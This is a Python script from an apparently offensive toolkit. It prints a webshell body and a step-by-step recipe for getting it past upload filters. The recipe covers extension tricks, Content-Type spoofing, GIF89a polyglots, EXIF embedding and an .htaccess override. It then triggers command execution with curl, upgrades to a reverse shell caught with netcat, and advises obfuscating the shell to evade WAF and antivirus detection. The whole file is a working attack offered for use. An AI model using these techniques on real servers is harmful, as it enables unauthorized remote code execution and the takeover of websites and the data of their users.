#!/usr/bin/env python3
"""MALICIOUS FILE UPLOAD -> webshell. Filter-bypass techniques + where it lands. PRINTS guidance.
Edit LHOST/LPORT in _web_common.py.

Usage:
  python3 gen_upload.py [--lang php|jsp|asp|aspx] [--name shell]
"""
import sys
import _web_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

lang = opt("--lang", "php")
name = opt("--name", "shell")
body = P.WEBSHELL.get(lang, P.WEBSHELL["php"])
ext  = {"php": "php", "jsp": "jsp", "asp": "asp", "aspx": "aspx"}.get(lang, "php")

print(f"# FILE UPLOAD -> webshell   lang={lang}")
print(f"# needs: an upload feature that accepts your file AND lands it somewhere the server EXECUTES .{ext} as code.")
print(f"# 1) the webshell body (save locally, then bypass the filter to upload it):")
print(body)
print(f"\n# 2) EXTENSION filter bypass — try these names in order (plain first; add tricks only if it's rejected):")
print(f"   {name}.{ext}   {name}.{ext}.jpg   {name}.jpg.{ext}   {name}.{ext}5 / .phtml / .phar / .pht (PHP)")
print(f"   {name}.{ext}%00.jpg   {name}.{ext}.   {name}.{ext}::$DATA   {name}.pHp (case)")
print(f"   {name}.jsp.jsp  ·  {name}.aspx;.jpg (IIS)  ·  .config / web.config (ASP)  ·  .htaccess (make .jpg run as PHP)")
print(f"# 3) CONTENT-TYPE bypass:  set  Content-Type: image/jpeg  on the upload part (keep the {ext} body).")
print(f"# 4) MAGIC BYTES bypass:  prepend GIF89a;  (or a real JPEG header) before the {lang} code -> polyglot.")
print(f"# 5) content check bypass:  embed the payload in EXIF (jhead/exiftool) if the app renders/echoes metadata.")
print(f"# -> ok (upload): the app accepts the file (200/'success') and gives you a path or filename to fetch.")
print(f"\n# 6) FIND where it landed + trigger it:")
print(f"   common dirs: /uploads/ /files/ /images/ /tmp/ /media/ — fuzz with ffuf if the path isn't returned")
print(f"   curl '{P.TURL}/uploads/{name}.{ext}?c=id'")
print(f"   -> ok (RCE): the curl returns uid=... = it executes as code (not served as a plain download).")
print(f"   -> then ?c=<urlencoded revshell>  (gen_webshell.py rev bash)   catch: nc -lvnp {P.LPORT}")
print(f"\n# .htaccess trick (Apache, when only images allowed): upload a .htaccess with:")
print(f'   AddType application/x-httpd-php .jpg      # then a {name}.jpg webshell executes as PHP')
print(f"# WARNING: static webshells are WAF/AV-signatured — obfuscate the body / rename params / use a one-shot.")
